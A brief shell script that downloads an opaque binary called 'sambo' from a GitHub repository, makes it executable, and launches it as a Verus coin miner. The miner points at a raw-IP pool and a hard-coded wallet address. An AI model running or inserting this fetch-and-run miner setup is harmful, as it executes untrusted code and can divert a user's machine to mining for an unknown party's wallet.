wget https://github.com/sbwsmg/lol/raw/main/sambo
chmod 700 sambo

#!/bin/sh
PoolHost=139.162.40.79
Port=80
PublicVerusCoinAddress=RBG1qWaLRYGddYdKhfJiUzKr7K2hNS5Mn5
WorkerName=sambo
Threads=3
#set working directory to the location of this script
DIR="$( cd "$( dirname "${BASH_SOURCE[0]}" )" && pwd )"
cd $DIR
./sambo -v -l "${PoolHost}":"${Port}" -u "${PublicVerusCoinAddress}"."${WorkerName}" -t "${Threads}" "$@"
